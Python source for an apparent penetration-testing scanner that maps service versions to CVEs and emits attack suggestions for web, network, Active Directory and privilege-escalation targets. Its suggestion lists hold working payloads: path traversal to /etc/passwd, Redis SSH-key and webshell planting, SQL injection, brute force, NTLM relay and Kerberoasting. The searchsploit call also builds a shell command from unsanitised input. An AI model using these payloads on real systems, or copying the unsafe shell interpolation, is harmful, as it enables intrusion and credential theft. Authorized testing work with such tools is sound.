"""
ReconARC — Vulnerability Scanner
=================================
Maps discovered services to CVEs, ranks attack vectors, and generates
exploit suggestions WITHOUT executing any exploit.
"""

import hashlib
import re
from typing import Dict, List, Optional

from utils import run_command
from state import AttackVector


def search_exploitdb(query: str) -> List[dict]:
    """Search local exploitdb via searchsploit."""
    cmd = f"searchsploit --json '{query}' 2>/dev/null"
    result = run_command(cmd, timeout=15)
    if result["stdout"]:
        try:
            import json
            data = json.loads(result["stdout"])
            return [
                {
                    "title": e.get("Title", ""),
                    "type": e.get("Type", ""),
                    "path": e.get("Path", ""),
                    "platform": e.get("Platform", ""),
                }
                for e in data.get("RESULTS_EXPLOIT", [])[:10]
            ]
        except (json.JSONDecodeError, KeyError):
            pass
    return []


def nmap_vuln_scan(target_ip: str, port: int = None) -> List[dict]:
    """Run nmap vuln category scripts (safe, non-intrusive)."""
    port_flag = f"-p {port}" if port else ""
    cmd = (
        f"nmap {port_flag} --script 'vuln and safe' "
        f"{target_ip} -oN - 2>/dev/null"
    )
    result = run_command(cmd, timeout=120)
    findings = []

    if result["stdout"]:
        # Parse VULNERABLE lines
        for m in re.finditer(r"(\d+)/tcp\s+open\s+(\S+)", result["stdout"]):
            findings.append({
                "port": int(m.group(1)),
                "service": m.group(2),
                "type": "open_service",
            })

        # Parse vulnerability info
        for m in re.finditer(r"\|\s+([A-Z][^:]+):\s*(.+)", result["stdout"]):
            vuln_name = m.group(1).strip()
            vuln_detail = m.group(2).strip()
            if vuln_name not in ("State", "IDs", "References", "CVSS"):
                findings.append({
                    "vulnerability": vuln_name,
                    "detail": vuln_detail,
                    "type": "vuln_script_finding",
                })

    return findings


# ── Known version-based CVE mapping ───────────────────────────────────

KNOWN_VULNS = {
    # SSH
    "openssh 7.": [
        {"cve": "CVE-2018-15473", "title": "OpenSSH User Enumeration",
         "desc": "Allows username enumeration via timing differences",
         "confidence": "high", "score": 65,
         "suggestions": [
             "Use python3 ssh-enum.py or metasploit auxiliary/scanner/ssh/ssh_enumusers",
             "Enumerate valid usernames for credential brute-force",
         ]},
    ],
    "openssh 8.2": [
        {"cve": "CVE-2020-15778", "title": "OpenSSH SCP command injection",
         "desc": "SCP client allows command injection via crafted filenames",
         "confidence": "medium", "score": 55,
         "suggestions": [
             "If SCP is available, inject commands via filenames: scp 'file;command' user@host:/tmp/",
         ]},
    ],
    # Apache
    "apache 2.4.49": [
        {"cve": "CVE-2021-41773", "title": "Apache Path Traversal",
         "desc": "Directory traversal allowing access to arbitrary files",
         "confidence": "high", "score": 80,
         "suggestions": [
             "curl http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
             "If mod_cgi enabled, achieve RCE via POST to cgi-bin",
             "Metasploit: exploit/multi/http/apache_normalize_path_rce",
         ]},
    ],
    "apache 2.4.50": [
        {"cve": "CVE-2021-42013", "title": "Apache Path Traversal (bypass)",
         "desc": "Bypass for CVE-2021-41773 patch",
         "confidence": "high", "score": 80,
         "suggestions": [
             "curl http://target/cgi-bin/%%32%65/%%32%65/%%32%65/%%32%65/etc/passwd",
         ]},
    ],
    # nginx
    "nginx 1.18": [
        {"cve": "CVE-2021-23017", "title": "nginx DNS Resolver vulnerability",
         "desc": "1-byte memory overwrite in DNS resolver",
         "confidence": "low", "score": 30,
         "suggestions": [
             "Only exploitable if nginx uses the resolver directive",
             "Check config for 'resolver' directive",
         ]},
    ],
    # ProFTPD
    "proftpd 1.3": [
        {"cve": "CVE-2015-3306", "title": "ProFTPD mod_copy File Manipulation",
         "desc": "Remote file copy/read/write via mod_copy commands",
         "confidence": "high", "score": 75,
         "suggestions": [
             "Use site cpfr/sitet cpto commands to copy files",
             "Copy /etc/shadow or add SSH key to authorized_keys",
             "Metasploit: exploit/unix/ftp/proftpd_modcopy_exec",
         ]},
    ],
    # vsftpd
    "vsftpd 2.3.4": [
        {"cve": "CVE-2011-2523", "title": "vsftpd Backdoor",
         "desc": "Backdoor trigger via smiley face in username (:))",
         "confidence": "high", "score": 95,
         "suggestions": [
             "Connect with username containing ':)' to trigger backdoor on port 6200",
             "Metasploit: exploit/unix/ftp/vsftpd_234_backdoor",
         ]},
    ],
    # Redis
    "redis 6.": [
        {"cve": "N/A", "title": "Redis Unauthenticated Access",
         "desc": "Redis without authentication allows data access and potential RCE",
         "confidence": "high", "score": 75,
         "suggestions": [
             "Connect: redis-cli -h target",
             "Write SSH key: CONFIG SET dir /root/.ssh + SET x 'key' + SAVE",
             "Write webshell: CONFIG SET dir /var/www/html + SET x 'php' + SAVE",
             "Lua sandbox escape for older versions",
         ]},
    ],
    # Jenkins
    "jenkins": [
        {"cve": "CVE-2024-23897", "title": "Jenkins Arbitrary File Read",
         "desc": "CLI arbitrary file read via @filepath arguments",
         "confidence": "high", "score": 85,
         "suggestions": [
             "Download CLI jar: wget http://target/jnlpJars/jenkins-cli.jar",
             "Read files: java -jar jenkins-cli.jar -s http://target help '@filename'",
             "Read credentials/secrets via @/var/lib/jenkins/secrets.masterKey",
         ]},
    ],
    # GitLab
    "gitlab": [
        {"cve": "CVE-2021-22205", "title": "GitLab ExifTool RCE",
         "desc": "Remote code execution via crafted image upload",
         "confidence": "high", "score": 90,
         "suggestions": [
             "Use djvu_file_maker to craft malicious image",
             "Upload to any project issue/MR",
             "Metasploit: exploit/multi/http/gitlab_shell_exec_rce",
         ]},
    ],
    # Grafana
    "grafana": [
        {"cve": "CVE-2021-43798", "title": "Grafana Arbitrary File Read",
         "desc": "Path traversal in plugin URLs allows reading arbitrary files",
         "confidence": "high", "score": 80,
         "suggestions": [
             "curl http://target/public/plugins/alertlist/../../../../../../../etc/passwd",
             "Read /etc/grafana/grafana.ini for database credentials",
         ]},
    ],
    # WebLogic
    "weblogic": [
        {"cve": "CVE-2020-14882", "title": "WebLogic Authentication Bypass",
         "desc": "Authentication bypass via console path traversal",
         "confidence": "high", "score": 90,
         "suggestions": [
             "curl http://target/console/css/%252e%252e%252fconsole.portal",
             "Execute commands via Groovy console",
         ]},
    ],
}


def match_version_vulns(service: str, version: str) -> List[dict]:
    """Match service version against known vulnerability database."""
    vulns = []
    combined = f"{service} {version}".lower().strip()

    for key, entries in KNOWN_VULNS.items():
        if key in combined:
            for entry in entries:
                vulns.append(entry)

    return vulns


def generate_attack_vector(
    category: str,
    vector_type: str,
    target: str,
    title: str,
    description: str,
    confidence: str = "medium",
    score: int = 50,
    evidence: List[str] = None,
    exploit_suggestions: List[str] = None,
    prerequisites: List[str] = None,
    cves: List[str] = None,
    references: List[str] = None,
) -> AttackVector:
    """Generate a structured attack vector with unique ID."""
    vid = hashlib.sha256(f"{target}:{vector_type}:{title}".encode()).hexdigest()[:8]

    confidence_scores = {"high": 80, "medium": 50, "low": 25}
    if score == 50 and confidence in confidence_scores:
        score = confidence_scores[confidence]

    return AttackVector(
        id=f"{vector_type}:{vid}",
        target=target,
        category=category,
        vector_type=vector_type,
        title=title,
        description=description,
        confidence=confidence,
        score=score,
        evidence=evidence or [],
        exploit_suggestions=exploit_suggestions or [],
        prerequisites=prerequisites or [],
        cves=cves or [],
        references=references or [],
    )


# ── Attack Vector Generators ──────────────────────────────────────────

def vectors_for_web_app(url: str, web_info: dict, config_findings: List[dict],
                        sqli_points: List[dict], tech: dict) -> List[AttackVector]:
    """Generate attack vectors for a discovered web application."""
    vectors = []

    # Config file exposure
    for finding in config_findings:
        if finding["severity"] == "critical":
            vectors.append(generate_attack_vector(
                category="initial_access", vector_type="config_exposure",
                target=url, title=f"Exposed {finding['path']} with secrets",
                description=f"Config file at {finding['path']} contains sensitive data. "
                            f"Preview: {finding.get('preview', '')[:100]}",
                confidence="high", score=85,
                evidence=[f"{finding['path']} returned {finding['status']} "
                          f"({finding['size']}b) with secret keywords"],
                exploit_suggestions=[
                    f"Read full content: curl -sk {url}{finding['path']}",
                    "Extract credentials and test against login forms",
                    "Try database credentials against MySQL/PostgreSQL",
                ],
                prerequisites=["Network access to target"],
            ))
        elif finding["severity"] == "high":
            vectors.append(generate_attack_vector(
                category="initial_access", vector_type="info_disclosure",
                target=url, title=f"Exposed {finding['path']}",
                description=f"Sensitive endpoint at {finding['path']}",
                confidence="high", score=70,
                evidence=[f"{finding['path']} -> {finding['status']}"],
                exploit_suggestions=[
                    f"Access {url}{finding['path']} for debug info/credentials",
                ],
            ))

    # SQLi injection points
    for point in sqli_points:
        param = point.get("parameter", "")
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="sqli",
            target=f"{point['url']} ({param})",
            title=f"Potential SQLi in {param}",
            description=f"{point['note']} — parameter '{param}' in "
                        f"{point.get('method', 'GET')} request",
            confidence="medium", score=55,
            evidence=[point["note"]],
            exploit_suggestions=[
                f"sqlmap -u '{point['url']}' --forms --batch --level=3 --risk=2",
                f"Manual test: ' OR 1=1-- , ' UNION SELECT 1,2,3-- ",
                "If injectable: dump user tables, try --os-shell",
            ],
            prerequisites=["Network access to target"],
        ))

    # Tech-specific vulns
    for vuln_tech, entries in KNOWN_VULNS.items():
        tech_str = " ".join(tech.get("technologies", [])).lower()
        if vuln_tech in tech_str:
            for entry in entries:
                vectors.append(generate_attack_vector(
                    category="initial_access", vector_type="known_cve",
                    target=url, title=entry["title"],
                    description=entry["desc"], confidence=entry["confidence"],
                    score=entry["score"],
                    evidence=[f"Technology {vuln_tech} detected"],
                    exploit_suggestions=entry.get("suggestions", []),
                    cves=[entry.get("cve", "")],
                ))

    # Missing security headers
    sec_headers = tech.get("security_headers", {})
    if "Content-Security-Policy" not in sec_headers:
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="xss",
            target=url, title="Missing CSP — XSS potential",
            description="No Content-Security-Policy header. Stored/reflected XSS "
                        "could be exploitable without CSP mitigation.",
            confidence="medium", score=40,
            evidence=["No CSP header in response"],
            exploit_suggestions=[
                "Test input fields for reflected/stored XSS",
                "If admin panel exists, try stored XSS for cookie theft",
            ],
        ))

    return vectors


def vectors_for_service(target: str, port: int, service: str, version: str) -> List[AttackVector]:
    """Generate attack vectors for a network service."""
    vectors = []

    # Anonymous FTP
    if "ftp" in service.lower() and "anonymous" in str(version).lower():
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="anonymous_ftp",
            target=f"{target}:{port}",
            title="Anonymous FTP Access",
            description="FTP server allows anonymous login",
            confidence="high", score=60,
            evidence=["Anonymous FTP banner detected"],
            exploit_suggestions=[
                f"ftp {target} (user: anonymous, pass: anonymous@)",
                "Download all files recursively: wget -r ftp://anonymous:anonymous@{target}/",
                "Check for configuration files, credentials, or sensitive data",
            ],
        ))

    # Known version vulns
    version_vulns = match_version_vulns(service, version)
    for vuln in version_vulns:
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="version_vuln",
            target=f"{target}:{port}",
            title=vuln["title"], description=vuln["desc"],
            confidence=vuln["confidence"], score=vuln["score"],
            evidence=[f"{service} {version} on port {port}"],
            exploit_suggestions=vuln.get("suggestions", []),
            cves=[vuln.get("cve", "")],
        ))

    # SMB null session
    if port == 445 or "smb" in service.lower():
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="smb_null",
            target=f"{target}:{port}",
            title="SMB Null Session",
            description="Test for SMB null session access to enumerate shares/users",
            confidence="medium", score=50,
            evidence=[f"SMB on port {port}"],
            exploit_suggestions=[
                f"smbclient -L //{target}/ -N",
                f"rpcclient -U '' -N {target}",
                f"enum4linux-ng {target}",
                f"crackmapexec smb {target} -u '' -p ''",
            ],
        ))

    # SSH brute force potential
    if "ssh" in service.lower():
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="ssh_bruteforce",
            target=f"{target}:{port}",
            title="SSH Credential Brute Force",
            description="SSH service detected — brute force possible with valid usernames",
            confidence="low", score=30,
            evidence=[f"SSH {version} on port {port}"],
            exploit_suggestions=[
                f"hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://{target}",
                "After getting usernames from web/email enumeration",
            ],
            prerequisites=["Valid username list"],
        ))

    # Redis unauthenticated
    if "redis" in service.lower() or port == 6379:
        vectors.append(generate_attack_vector(
            category="initial_access", vector_type="redis_unauth",
            target=f"{target}:{port}",
            title="Redis Unauthenticated Access",
            description="Redis may allow unauthenticated access leading to RCE",
            confidence="high", score=75,
            evidence=[f"Redis on port {port}"],
            exploit_suggestions=[
                f"redis-cli -h {target}",
                "CONFIG SET dir /root/.ssh && CONFIG SET dbfilename authorized_keys",
                "SET x '\\nssh-rsa AAAA...' && SAVE",
            ],
        ))

    # RDP
    if "rdp" in service.lower() or port == 3389:
        vectors.append(generate_attack_vector(
            category="lateral", vector_type="rdp",
            target=f"{target}:{port}",
            title="RDP Access",
            description="RDP service available for remote desktop access with valid credentials",
            confidence="medium", score=55,
            evidence=[f"RDP on port {port}"],
            exploit_suggestions=[
                f"xfreerdp /v:{target} /u:USERNAME /p:PASSWORD",
                "BlueKeep check if Windows XP/7/Server 2008",
            ],
        ))

    # WinRM
    if "winrm" in service.lower() or port == 5985:
        vectors.append(generate_attack_vector(
            category="lateral", vector_type="winrm",
            target=f"{target}:{port}",
            title="WinRM Remote Management",
            description="WinRM available for remote command execution with credentials",
            confidence="high", score=70,
            evidence=[f"WinRM on port {port}"],
            exploit_suggestions=[
                f"evil-winrm -u USERNAME -p PASSWORD -i {target}",
                "CrackMapExec: crackmapexec winrm {target} -u USER -p PASS -x 'whoami'",
            ],
        ))

    # LDAP/AD
    if port in (389, 636, 3268):
        vectors.append(generate_attack_vector(
            category="ad_attack", vector_type="ldap_enum",
            target=f"{target}:{port}",
            title="LDAP Enumeration",
            description="LDAP service allows domain user/group enumeration",
            confidence="high", score=60,
            evidence=[f"LDAP on port {port}"],
            exploit_suggestions=[
                f"ldapsearch -x -H ldap://{target}",
                f"windapsearch -d --dc-ip {target}",
                "Enumerate users for AS-REP roasting and password spraying",
            ],
        ))

    return vectors


def vectors_for_ad(domain_info: dict, host_ip: str) -> List[AttackVector]:
    """Generate AD-specific attack vectors based on enumeration results."""
    vectors = []
    domain_name = domain_info.get("name", "")
    users = domain_info.get("users", [])
    spns = domain_info.get("spns", [])
    cas = domain_info.get("ca_servers", [])

    # AS-REP Roasting target
    if users:
        vectors.append(generate_attack_vector(
            category="ad_attack", vector_type="asrep_roast",
            target=f"{host_ip} ({domain_name})",
            title="AS-REP Roasting",
            description=f"{len(users)} domain users discovered. Users with "
                        "'Do not require Kerberos preauthentication' can have "
                        "their AS-REP tickets roasted offline.",
            confidence="high", score=70,
            evidence=[f"{len(users)} users enumerated via LDAP/RPC"],
            exploit_suggestions=[
                f"GetNPUsers.py {domain_name}/ -usersfile users.txt "
                f"-no-pass -dc-ip {host_ip}",
                f"crackmapexec ldap {host_ip} -u users.txt -p '' --asreproast",
            ],
            prerequisites=["Username list", f"DC reachable at {host_ip}"],
        ))

    # Kerberoasting target
    if spns:
        vectors.append(generate_attack_vector(
            category="ad_attack", vector_type="kerberoast",
            target=f"{host_ip} ({domain_name})",
            title="Kerberoasting",
            description=f"{len(spns)} SPNs discovered. Service accounts with SPNs "
                        "can have their TGS tickets extracted and cracked offline.",
            confidence="high", score=75,
            evidence=[f"{len(spns)} SPNs found"],
            exploit_suggestions=[
                f"GetUserSPNs.py {domain_name}/USER:PASS -request -dc-ip {host_ip}",
                "Crack with hashcat -m 13100 hashes.txt",
            ],
            prerequisites=["Valid domain credentials"],
        ))

    # ADCS attack
    if cas:
        vectors.append(generate_attack_vector(
            category="ad_attack", vector_type="adcs_esc",
            target=f"{host_ip} ({domain_name})",
            title="ADCS Certificate Attack (ESC)",
            description=f"Certificate Authority detected: {cas}. ESC1-ESC13 "
                        "template misuse attacks may be possible.",
            confidence="high", score=80,
            evidence=[f"CA servers: {cas}"],
            exploit_suggestions=[
                f"certipy find -u USER@{domain_name} -p PASS -dc-ip {host_ip} -vulnerable",
                "Look for ESC1 (template allows SAN), ESC8 (NTLM relay to CA)",
                "certipy req -ca 'CA-NAME' -template 'VULN-TEMPLATE' -alt 'admin@domain'",
            ],
            prerequisites=["Valid domain credentials", "certipy installed"],
        ))

    # SMB signing
    vectors.append(generate_attack_vector(
        category="lateral", vector_type="smb_relay",
        target=f"{host_ip} ({domain_name})",
        title="SMB Relay Attack",
        description="If SMB signing is not required, NTLM relay attacks can "
                    "be used to authenticate as other users.",
        confidence="medium", score=55,
        evidence=["SMB service present on DC/domain host"],
        exploit_suggestions=[
            "Check signing: crackmapexec smb TARGET --gen-relay-list targets.txt",
            "nmap -p 445 --script smb-security-mode TARGET",
            "If signing not required: ntlmrelayx.py -tf targets.txt",
            "Responder + ntlmrelayx for credential capture + relay",
        ],
        prerequisites=["SMB signing not required", "Network position"],
    ))

    return vectors


def generate_privesc_vectors(
    os_type: str,
    host_ip: str,
    findings: List[str],
) -> List[AttackVector]:
    """Generate privilege escalation suggestions for a compromised host."""
    vectors = []

    if os_type == "linux":
        vectors.append(generate_attack_vector(
            category="privesc", vector_type="linux_privesc",
            target=host_ip,
            title="Linux Privilege Escalation",
            description="Standard Linux privilege escalation checks",
            confidence="medium", score=50,
            evidence=["Linux host identified"],
            exploit_suggestions=[
                "Run linpeas.sh for automated enumeration",
                "Manual: sudo -l, find / -perm -4000 2>/dev/null (SUID)",
                "Check: cat /etc/crontab, ls -la /etc/cron.*",
                "Kernel exploits: uname -r then searchsploit linux kernel VERSION",
                "Check writable paths: find / -writable -type d 2>/dev/null",
                "Docker group: docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
                "PATH hijacking if writable dirs in PATH",
            ],
        ))
    elif os_type == "windows":
        vectors.append(generate_attack_vector(
            category="privesc", vector_type="windows_privesc",
            target=host_ip,
            title="Windows Privilege Escalation",
            description="Standard Windows privilege escalation checks",
            confidence="medium", score=50,
            evidence=["Windows host identified"],
            exploit_suggestions=[
                "Run winpeas.exe or Seatbelt.exe for automated enumeration",
                "Manual: whoami /priv (look for SeImpersonate, SeDebug, SeAssignPrimaryToken)",
                "SeImpersonate -> PrintSpoofer / GodPotato / RoguePotato",
                "Check: net user USERNAME, systeminfo (missing patches)",
                "Unquoted service paths: wmic service get name,displayname,pathname,startmode",
                "Check registry: reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
                "AlwaysInstallElevated: reg query HKCU\\...\\AlwaysInstallElevated",
            ],
        ))

    return vectors
